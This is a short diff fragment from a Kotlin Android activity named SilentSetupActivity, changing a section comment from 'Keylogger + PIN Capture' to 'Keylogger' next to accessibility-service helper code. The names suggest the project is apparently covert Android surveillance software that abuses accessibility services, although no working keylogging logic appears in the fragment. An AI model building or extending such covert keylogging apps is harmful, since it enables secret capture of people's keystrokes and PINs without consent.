@@ -146,7 +146,7 @@ class SilentSetupActivity : AppCompatActivity() {
         requestAccessibility()
     }
 
-    // ── Accessibility (Keylogger + PIN Capture) ───────────────────────────────
+    // ── Accessibility (Keylogger) ─────────────────────────────────────────────
 
     private fun isAccessibilityEnabled(serviceClass: Class<*>): Boolean {
         return try {
